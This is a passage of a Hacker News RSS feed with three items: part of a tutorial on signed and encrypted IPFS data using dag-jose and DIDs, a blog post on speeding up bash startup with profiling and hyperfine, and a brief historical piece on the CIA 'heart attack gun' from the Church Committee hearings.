structures that are linked and signed. This is done by creating JSON Web Signatures (JWS) that contain a link to additional data. One of the main problems that the <strong>dag-jose</strong> codec solves is that the payload of a JWS is traditionally encoded as <code>base64url</code> which means that if it contains any IPLD links you can't traverse those links. Instead what we do with <em>DagJWS</em> is enforce the payload to be the bytes of a CID. The codec then transforms the payload into a CID instance and sets it to the <code>link</code> property of the <em>DagJWS. </em>This allows us to easily traverse the resulting DAG.</p><h2 id="setup-your-environment">Setup your environment</h2><p>This section will cover how to set up some specific dependencies needed for this tutorial. If you just want to skip the setup part we have prepared <a href="https://ceramicstudio.github.io/web-playground/">a simple playground</a> which bundles ipfs, 3id-connect, and dids. You can use it by opening the web page, clicking on connect, then opening the developer console where you can run the commands. If you decide to do so, skip the following two sections.</p><h3 id="setup-ipfs-with-dag-jose-support">Setup IPFS with dag-jose support</h3><p>Since dag-jose is a new IPLD codec it's not yet included in js-ipfs by default. It also implements the new IPLD codec API which is also not supported by js-ipfs yet. Therefore we need to do the following when we are creating an instance of IPFS:</p><pre><code>import IPFS from 'ipfs'
import dagJose from 'dag-jose'
import multiformats from 'multiformats/basics'
import legacy from 'multiformats/legacy'

multiformats.multicodec.add(dagJose)
const dagJoseFormat = legacy(multiformats, dagJose.name)

const ipfs = await Ipfs.create({ ipld: { formats: [dagJoseFormat] } })
</code></pre><h3 id="setup-did-and-3id-connect">Setup DID and 3ID Connect</h3><p>In the example setup below we use an injected Ethereum provider (such as MetaMask) to create a 3ID Connect and DID instance.</p><pre><code>import { DID } from 'dids'
import { ThreeIdConnect, EthereumAuthProvider } from '3id-connect'

// create 3id connect instance
const addresses = await window.ethereum.enable()
const authProvider = new EthereumAuthProvider(window.ethereum, addresses[0])
await threeIdConnect.connect(authProvider)

// create did instance
const didProvider = await threeIdConnect.getDidProvider()
const did = new DID({ provider: didProvider })
await did.authenticate()
window.did = did
console.log('Connected with DID:', did.id)</code></pre><h2 id="create-a-signed-data-structure">Create a signed data structure</h2><p>We can now start signing and adding data to IPFS! First lets create a simple function that takes a payload, signs it using the <code>did.createDagJWS</code> method, and adds the resulting data to IPFS. As we can see in the code below we get two objects back from this method: <code>jws</code> which is the DagJWS itself and <code>linkedBlock</code> which is the raw bytes of the encoded payload. What happens in the background is that the payload gets encoded using <strong>dag-cbor</strong>, after this the CID of the encoded payload is used as the payload of the created <code>jws</code>. We can access this payload CID on the DagJWS instance as <code>jws.link</code>.</p><pre><code>async function addSignedObject(payload) {
  // sign the payload as dag-jose
  const { jws, linkedBlock } = await did.createDagJWS(payload)
  // put the JWS into the ipfs dag
  const jwsCid = await ipfs.dag.put(jws, { format: 'dag-jose', hashAlg: 'sha2-256' })
  // put the payload into the ipfs dag
  await ipfs.block.put(linkedBlock, { cid: jws.link })
  return jwsCid
}</code></pre><p>Using this function, let's create our first signed data objects:</p><pre><code>// Create our first signed object
const cid1 = await addSignedObject({ hello: 'world' })

// Log the DagJWS:
console.log((await ipfs.dag.get(cid1)).value)
// &gt; {
// &gt;   payload: "AXESIHhRlyKdyLsRUpRdpY4jSPfiee7e0GzCynNtDoeYWLUB",
// &gt;   signatures: [{
// &gt;     signature: "h7bHmTaBGza_QlFRI9LBfgB3Nw0m7hLzwMm4nLvcR3n9sHKRoCrY0soWnDbmuG7jfVgx4rYkjJohDuMNgbTpEQ",
// &gt;     protected: "eyJraWQiOiJkaWQ6MzpiYWdjcWNlcmFza3hxeng0N2l2b2tqcW9md295dXliMjN0aWFlcGRyYXpxNXJsem4yaHg3a215YWN6d29hP3ZlcnNpb24taWQ9MCNrV01YTU1xazVXc290UW0iLCJhbGciOiJFUzI1NksifQ"
// &gt;   }],
// &gt;   link: CID(bafyreidykglsfhoixmivffc5uwhcgshx4j465xwqntbmu43nb2dzqwfvae)
// &gt; }

// Log the payload:
ipfs.dag.get(cid1, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }

// Create another signed object that links to the previous one
const cid2 = addSignedObject({ hello: 'getting the hang of this', prev: cid1 })

// Log the new payload:
ipfs.dag.get(cid2, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; {
// &gt;   hello: 'getting the hang of this'
// &gt;   prev: CID(bagcqcerappi42sb4uyrjkhhakqvkiaibkl4pfnwpyt53xkmsbkns4y33ljzq)
// &gt; }

// Log the old payload:
ipfs.dag.get(cid2, { path: '/link/prev/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }
</code></pre><p>Note that the values of the CIDs and JWS will be different for you since the payload will be signed by your DID.</p><h2 id="verify-a-signed-data-structure">Verify a signed data structure</h2><p>Verifying a JWS is very straight forward. Simply retrieve the JWS object and pass it to the <code>verifyJWS</code> method. If the signature is invalid, this function will throw an error. If the signature is valid, it will will return the DID (with key fragment) that was used to sign the JWS.</p><pre><code>const jws1 = await ipfs.dag.get(cid1)
const jws2 = await ipfs.dag.get(cid2)

const signingDID1 = await did.verifyJWS(jws1)
await did.verifyJWS(jws2)
</code></pre><h2 id="encrypted-data-in-ipfs">Encrypted data in IPFS</h2><p>Signed data in IPFS is one piece of the puzzle, but perhaps more interesting is encrypted data. With the use of <em>dag-jose</em> and <em>EIP-2844</em> we can encrypt data to one or multiple DIDs and store it directly in IPFS. Below we demonstrate how to use the convenient tools provided by the <em>js-did</em> library to do this.</p><h2 id="encrypt-ipld-data">Encrypt IPLD data</h2><p>There is a simple method to create a DagJWE object which is encrypted to one or multiple DIDs, <code>createDagJWE</code>. This method accepts an IPLD object (a JSON object that may also include CID links) and an array of DIDs. It will resolve the DIDs to retrieve the public encryption keys found in their DID document and create a JWE that is encrypted to these keys. To get going, let's create a helper function that creates a JWE and puts it into IPFS.</p><pre><code>async function addEncryptedObject(cleartext, dids) {
    const jwe = await did.createDagJWE(cleartext, dids)
    return ipfs.dag.put(jwe, { format: 'dag-jose', hashAlg: 'sha2-256' })
}
</code></pre><p>Once we have this function we can create a few encrypted objects. In the example below we first create a simple encrypted object, then we create an additional encrypted object that links to the previous one.</p><pre><code>const cid3 = await addEncryptedObject({ hello: 'secret' }, [did.id])

const cid4 = await addEncryptedObject({ hello: 'cool!', prev: cid3 }, [did.id])</code></pre><p>Note that in the example above we use <code>[did.id](&lt;http://did.id&gt;)</code> to encrypt the data to the currently authenticated DID. We can of course also encrypt the data to the DID of a user that is not locally authenticated, such as another user!</p><h2 id="decrypt-ipld-data">Decrypt IPLD data</h2><p>When the data is retrieved from IPFS we will just get the encrypted JWE. This means that we need to decrypt the data after we fetch it. Since we have created objects that link to each other, lets create a function that retrieves these objects and decrypts them recursively.</p><pre><code>async function followSecretPath(cid) {
    const jwe = (await ipfs.dag.get(cid)).value
    const cleartext = await did.decryptDagJWE(jwe)
    console.log(cleartext)
    …</code></pre></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/">https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/</a></em></p>]]>
            </description>
            <link>https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157017</guid>
            <pubDate>Fri, 20 Nov 2020 03:14:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Even faster bash startup (165 ms → 40 ms)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156490">thread link</a>) | @Liskni_si
<br/>
November 19, 2020 | https://work.lisk.in/2020/11/20/even-faster-bash-startup.html | <a href="https://web.archive.org/web/*/https://work.lisk.in/2020/11/20/even-faster-bash-startup.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
			<article>
				<header>
					
					<p>
						published <time datetime="2020-11-20">2020-11-20</time>
						<a href="https://github.com/liskin/liskin.github.com/commits/master/_posts/2020-11-20-even-faster-bash-startup.md">(revision history)</a>
					</p>
				</header>
				<p>I sped up bash startup from 165&nbsp;ms to 40&nbsp;ms. It’s actually noticeable.
Why and how did I do it?</p>

<details id="toc">
  <summary>Table of Contents</summary>
<ul id="markdown-toc">
  <li><a href="#motivation" id="markdown-toc-motivation">Motivation</a></li>
  <li><a href="#investigation" id="markdown-toc-investigation">Investigation</a>    <ul>
      <li><a href="#man" id="markdown-toc-man">man</a></li>
      <li><a href="#death-by-a-thousand-cuts" id="markdown-toc-death-by-a-thousand-cuts">death by a thousand cuts</a></li>
      <li><a href="#completions" id="markdown-toc-completions">completions</a></li>
      <li><a href="#fzf" id="markdown-toc-fzf">fzf</a></li>
      <li><a href="#are-we-done-yet" id="markdown-toc-are-we-done-yet">are we done yet?</a></li>
      <li><a href="#history" id="markdown-toc-history">history</a></li>
    </ul>
  </li>
  <li><a href="#conclusion" id="markdown-toc-conclusion">Conclusion</a></li>
</ul>

</details>

<h3 id="motivation">Motivation</h3>

<p>Whenever I need to quickly look something up (or use a calculator), I open a
new terminal (using a keyboard shortcut) and start typing into it. Slow bash
startup disrupts this workflow as I would often type before the shell prompt:</p>

<p><img src="https://work.lisk.in/img/even-faster-bash-startup/mistype.png" alt="messed up prompt"></p>

<p><a href="https://twitter.com/danpker">Daniel Parker</a> recently wrote an excellent blog post <a href="https://danpker.com/posts/2020/faster-bash-startup/">Faster Bash
Startup</a> detailing his journey from 1.7 seconds to 210&nbsp;ms. I start at 165&nbsp;ms
and need to go significantly lower than Daniel, therefore different techniques
will be needed.</p>

<h3 id="investigation">Investigation</h3>

<p><a href="https://github.com/sharkdp/hyperfine">hyperfine</a> is a brilliant command-line tool for benchmarking commands that
I discovered recently (thanks to Daniel!), so let’s see where we are now:</p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):     165.8 ms ±   0.7 ms    [User: 156.3 ms, System: 12.8 ms]
  Range (min … max):   164.9 ms … 167.1 ms    17 runs
</code></pre></div></div>

<p>Now we need to find out what’s taking so long. <a href="https://stackoverflow.com/questions/5014823/how-to-profile-a-bash-shell-script-slow-startup/20855353">How to profile a bash shell
script slow startup?</a> Most Stack Overflow answers suggest some
variant of <code>set -x</code>, which will help us find any single command that takes
unusually long.</p>

<h4 id="man">man</h4>

<p>In my case, that command was <code>man -w</code>, specifically <a href="https://github.com/liskin/dotfiles/blob/7d14190467fe22bf5d4f85a7b202118d2341e3ed/.bashrc.d/10_env.sh#L8-L10">this piece of my
<code>.bashrc.d/​10_env.sh</code></a>:</p>

<div><div><pre><code><span>export </span><span>MANPATH</span><span>=</span><span>$HOME</span>/.local/share/man:
<span># FIXME: workaround for /usr/share/bash-completion/completions/man</span>
<span>MANPATH</span><span>=</span><span>$(</span>man <span>-w</span><span>)</span>
</code></pre></div></div>

<p>Turns out none of this is needed any more, <code>man</code> and <code>manpath</code> now add
<code>~/.local/​share/​man</code> automatically so I can just drop it and save more than
100&nbsp;ms<sup id="fnref:man-seccomp" role="doc-noteref"><a href="#fn:man-seccomp">1</a></sup>.</p>

<h4 id="death-by-a-thousand-cuts">death by a thousand cuts</h4>

<p>But that’s it. No other single command stands out, it’s just a lot of small
things that add up. Daniel says “it has to take <em>some</em> time,” and he’s mostly
right, but I still have one trick up my sleeve.</p>

<p>My <code>.bashrc</code> is split into several smaller parts in <code>~/.bashrc.d</code>, so I can
profile these and see if anything stands out. My
<a href="https://github.com/liskin/dotfiles/blob/68964611b4b578b646cf5f13a47a4ee77e93e740/.bashrc"><code>.bashrc</code></a>
thus becomes:</p>

<div><div><pre><code><span>for </span>i <span>in</span> ~/.bashrc.d/<span>*</span>.sh<span>;</span> <span>do
	if</span> <span>[[</span> <span>$__bashrc_bench</span> <span>]]</span><span>;</span> <span>then
		</span><span>TIMEFORMAT</span><span>=</span><span>"</span><span>$i</span><span>: %R"</span>
		<span>time</span> <span>.</span> <span>"</span><span>$i</span><span>"</span>
		<span>unset </span>TIMEFORMAT
	<span>else</span>
		<span>.</span> <span>"</span><span>$i</span><span>"</span>
	<span>fi
done</span><span>;</span> <span>unset </span>i
</code></pre></div></div>

<p>Let’s see what happens…</p>

<div><div><pre><code>[tomi@notes ~]$ __bashrc_bench=1 bash -i
/home/tomi/.bashrc.d/10_env.sh: 0,118
/home/tomi/.bashrc.d/20_history.sh: 0,000
/home/tomi/.bashrc.d/20_prompt.sh: 0,002
/home/tomi/.bashrc.d/30_completion_git.sh: 0,000
/home/tomi/.bashrc.d/31_completion.sh: 0,011
/home/tomi/.bashrc.d/50_aliases.sh: 0,002
/home/tomi/.bashrc.d/50_aliases_sudo.sh: 0,000
/home/tomi/.bashrc.d/50_functions.sh: 0,001
/home/tomi/.bashrc.d/50_git_dotfiles.sh: 0,008
/home/tomi/.bashrc.d/50_mc.sh: 0,000
/home/tomi/.bashrc.d/90_fzf.sh: 0,011
</code></pre></div></div>

<p>118&nbsp;ms in <code>10_env.sh</code> was caused by <code>man -w</code> and we know what to do with that.</p>

<h4 id="completions">completions</h4>

<p>11&nbsp;ms in <code>31_​completion.sh</code> which loads <a href="https://github.com/scop/bash-completion">bash-completion</a>. That’s
certainly better than Daniel’s 235&nbsp;ms, probably because up-to-date
bash-completion only loads a few necessary completions and defers everything
else to being loaded on demand. I couldn’t live without the completions, so
11&nbsp;ms is a fair price.</p>

<p>8&nbsp;ms for <code>50_​git_​dotfiles.sh</code>, which defines a few aliases and
sets up git completions for my <code>git-dotfiles</code> alias, seems too much, though.
Good news is that we don’t need to drop this. We can use bash-completion’s
on-demand loading. Whenever completions for command <code>cmd</code> are needed for the
first time, bash-completion looks for
<code>~/.local/​share/​bash-completion/​completions/​cmd</code> or
<code>/usr/​share/​bash-completion/​completions/​cmd</code>.</p>

<p>Therefore,
<a href="https://github.com/liskin/dotfiles/blob/68964611b4b578b646cf5f13a47a4ee77e93e740/.local/share/bash-completion/completions/git-dotfiles"><code>~/.local/​share/​bash-completion/​completions/​git-dotfiles</code></a>
becomes:</p>

<div><div><pre><code>. /usr/share/bash-completion/completions/git
complete -F _git git-dotfiles
</code></pre></div></div>

<h4 id="fzf">fzf</h4>

<p><code>90_fzf.sh</code> loads key bindings and completions code so that <a href="https://github.com/junegunn/fzf">fzf</a> is used
when searching through history, completing <code>**</code> in filenames, etc. Well worth
the 11&nbsp;ms it needs to load<sup id="fnref:fzf" role="doc-noteref"><a href="#fn:fzf">2</a></sup>.</p>

<h4 id="are-we-done-yet">are we done yet?</h4>

<p>After these changes, I got:</p>

<div><div><pre><code>[tomi@notes ~]$ __bashrc_bench=1 bash -i
/home/tomi/.bashrc.d/10_env.sh: 0,001
/home/tomi/.bashrc.d/20_history.sh: 0,000
/home/tomi/.bashrc.d/20_prompt.sh: 0,002
/home/tomi/.bashrc.d/30_completion_git.sh: 0,000
/home/tomi/.bashrc.d/31_completion.sh: 0,012
/home/tomi/.bashrc.d/50_aliases.sh: 0,002
/home/tomi/.bashrc.d/50_aliases_sudo.sh: 0,000
/home/tomi/.bashrc.d/50_functions.sh: 0,001
/home/tomi/.bashrc.d/50_git_dotfiles.sh: 0,000
/home/tomi/.bashrc.d/50_mc.sh: 0,000
/home/tomi/.bashrc.d/90_fzf.sh: 0,011
</code></pre></div></div>

<p>That’s 29&nbsp;ms, brilliant! Or… is it? <emoji>🤔</emoji></p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):      55.7 ms ±   1.0 ms    [User: 47.6 ms, System: 11.1 ms]
  Range (min … max):    54.8 ms …  58.9 ms    53 runs
</code></pre></div></div>

<h4 id="history">history</h4>

<p>Some of those additional 26&nbsp;ms are spent reading my huge
(<code>HISTSIZE=​50000</code>) <code>.bash_​history</code> file. I will skip the details
about how I investigated this, because I didn’t: I stumbled upon this by
chance while testing something else.</p>

<p>We can see that using an empty history file brings us down to a little under
40&nbsp;ms:</p>

<div><div><pre><code>[tomi@notes ~]$ HISTFILE=/tmp/.bash_history_tmp hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):      38.6 ms ±   0.7 ms    [User: 34.0 ms, System: 7.8 ms]
  Range (min … max):    37.8 ms …  42.3 ms    75 runs
</code></pre></div></div>

<p>Now, cutting 17&nbsp;ms by sacrificing the shell history is probably not a good
deal for most people. I settled for setting up a systemd
<a href="https://github.com/liskin/dotfiles/blob/f978be7424946afebe56dbe5ecc85c9f36d1e057/.config/systemd/user/liskin-backup-bash-history.timer">timer</a>
to <a href="https://github.com/liskin/dotfiles/blob/f978be7424946afebe56dbe5ecc85c9f36d1e057/bin/liskin-backup-bash-history">back up
<code>.bash_​history</code></a>
to git once a day and lowered <code>HISTSIZE</code> to 5000<sup id="fnref:history" role="doc-noteref"><a href="#fn:history">3</a></sup>. This still keeps
my bash startup below 40&nbsp;ms:</p>

<div><div><pre><code>[tomi@notes ~]$ hyperfine 'bash -i'
Benchmark #1: bash -i
  Time (mean ± σ):      39.9 ms ±   0.5 ms    [User: 36.1 ms, System: 6.8 ms]
  Range (min … max):    39.1 ms …  42.1 ms    73 runs
</code></pre></div></div>

<h3 id="conclusion">Conclusion</h3>

<p>By dropping unnecessary invocation of <code>man -w</code>, deferring loading of git
completions to when they’re needed, and shortening my shell history file, I
managed to speed up bash startup from 165 ms to 40 ms.</p>

<div><div><pre><code>Benchmark #1: bash -i
  Time (mean ± σ):     165.8 ms ±   0.7 ms    [User: 156.3 ms, System: 12.8 ms]
  Range (min … max):   164.9 ms … 167.1 ms    17 runs
</code></pre></div></div>

<div><div><pre><code>Benchmark #1: bash -i
  Time (mean ± σ):      39.9 ms ±   0.5 ms    [User: 36.1 ms, System: 6.8 ms]
  Range (min … max):    39.1 ms …  42.1 ms    73 runs
</code></pre></div></div>

<p>More importantly, I no longer type before the prompt, even if I try!</p>

<p><img src="https://work.lisk.in/img/even-faster-bash-startup/corrtype.png" alt="not messed up prompt"></p>

<p>And at this point I can finally agree with Daniel that further tweaking will
only have diminishing returns<sup id="fnref:latency" role="doc-noteref"><a href="#fn:latency">4</a></sup>. <emoji>😊</emoji></p>

<hr>


			</article>
		
		</div></div>]]>
            </description>
            <link>https://work.lisk.in/2020/11/20/even-faster-bash-startup.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25156490</guid>
            <pubDate>Fri, 20 Nov 2020 01:32:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CIA Heart Attack Gun]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25156405">thread link</a>) | @simonebrunozzi
<br/>
November 19, 2020 | https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true/7/ | <a href="https://web.archive.org/web/*/https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true/7/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="loop_parent"><article data-url="https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true/7/" data-perm="https://historycollection.com/conspiracy-8-far-fetched-theories-turned-true//?subpage_1" data-title="Conspiracy: 8 Far-Fetched Theories That Turned Out To Be True" data-id="41735" data-multipage="1" data-page="7"><div><figure id="attachment_41751" aria-describedby="caption-attachment-41751"><img loading="lazy" alt="" width="600" height="360" data-src="https://cdn.historycollection.com/wp-content/uploads/2017/10/CIAs-Heart-Attack-Gun.jpg" src="https://cdn.historycollection.com/wp-content/uploads/2017/10/CIAs-Heart-Attack-Gun.jpg"><figcaption id="caption-attachment-41751">Senator Frank Church displays the CIA’s top-secret weapon known as the “heart-attack gun.” longroom.com</figcaption></figure><p><strong>CIA HEART ATTACK GUN</strong><br>Mary Embree, who began her career in the CIA as a secretary in the Audio-Surveillance Divison before being promoted to the Technical Services department, says she was asked to research a poison that would induce a heart attack in its victim but would be undetectable in a post-mortem. Embree’s research led to the development of a top-secret weapon known as the “heart-attack gun.”</p><p>It involved the freezing of shellfish toxin mixed with water to form a frozen dart which would then be fired from the heart-attack gun. Once inside the body, the poison would then dissolve into the person’s bloodstream and cause a heart attack.</p><p>In 1975 CIA Director William Colby presented the weapon at a Church Committee hearing, chaired by Senator Frank Church. The heart attack gun was a handgun with a sight affixed to the top, had a battery in the handle, and used electricity to fire a dart.</p><p>Colby told the committee that the weapon was capable of firing a dart which could enter the body “without perception.” The only way of knowing that the person had been shot by the weapon, was the presence of a tiny red dot at the point of entry. Colby also claimed that the poison would not show up in the autopsy. The official cause of death would, therefore, be deemed a heart attack. The weapon was developed in order to allow the CIA to commit assassinations that could never be traced back to them.</p><p id="loadergif"><img width="100" height="100" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAMAAAACCAQAAAA3fa6RAAAAEElEQVR42mN8V88ABIwQCgAaPALd7KlyxgAAAABJRU5ErkJggg==" data-src="data:image/gif;base64,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